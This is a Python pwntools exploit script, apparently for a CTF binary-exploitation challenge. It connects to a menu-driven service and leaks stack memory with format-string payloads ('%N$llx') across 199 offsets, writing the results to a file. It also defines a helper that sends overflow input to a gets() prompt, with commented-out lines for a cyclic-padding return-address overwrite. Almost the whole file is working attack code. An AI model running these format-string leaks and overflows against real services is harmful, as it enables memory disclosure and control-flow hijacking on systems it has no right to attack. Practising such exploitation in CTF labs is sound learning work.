import binascii
import re
import sys

from pwn import *

write = sys.stdout.buffer.write

host = '127.0.0.1'
port = 8888
# host = 'csie.ctf.tw'
# port = 10122

r = remote(host, port)

# payload = str.encode(cyclic(40))
# payload += p64(callme)

input('press enter to continue')

def get_stacks(beg, end, scanf_arg=b'llx'):
    print('='*20)
    print('getting from {} to {} in stacks'.format(beg, end))
    print('='*20)

    names = []
    for num in range(beg, end):
        # 1 - Send name
        r.recvuntil('>')
        r.sendline(b'1')
        r.recvuntil(':')
        r.sendline(b'%' + str(num).encode('utf-8') + b'$' + scanf_arg)
        # 2 - Show info
        r.recvuntil('>')
        r.sendline(b'2')
        r.recvuntil(':')
        name = r.recvuntil('*')[:-1]
        names += [name]
        print(num, end=' ')
    print('')
    return names

def input_to_overflow(payload):
    print('='*20)
    print('input to overflow')
    print('='*20)

    # Gets
    r.recvuntil('>')
    r.sendline(b'3')
    r.recvuntil(':')
    r.sendline(payload)

stacks = get_stacks(1, 200)
all_stack = b'\n'.join(stacks).decode('utf-8')
with open('./malloc_records/stack_3.txt', 'w') as f:
    print(all_stack, file=f)
# write(b'\n')

"""
call return
"""
# Exit
r.recvuntil('>')
r.sendline(b'4')

r.interactive()
